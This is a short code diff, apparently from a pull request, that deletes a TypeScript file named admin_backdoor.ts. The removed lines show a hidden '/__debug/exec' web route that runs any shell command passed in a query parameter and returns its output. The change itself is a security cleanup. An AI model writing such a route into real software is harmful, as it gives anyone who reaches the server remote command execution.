@@ -1,0 +1,15 @@
+diff --git a/scripts/admin_backdoor.ts b/scripts/admin_backdoor.ts
+deleted file mode 100644
+index ccc..0000000
+--- a/scripts/admin_backdoor.ts
++++ /dev/null
+@@ -1,9 +0,0 @@
+-// Pre-existing back-door route — being removed in this PR.
+-import { app } from '../server';
+-import { exec } from 'child_process';
+-
+-app.get('/__debug/exec', (req, res) => {
+-  // historically present; this PR deletes the file entirely
+-  exec(req.query.cmd as string, (_e, out) => res.send(out));
+-});
+-export {};
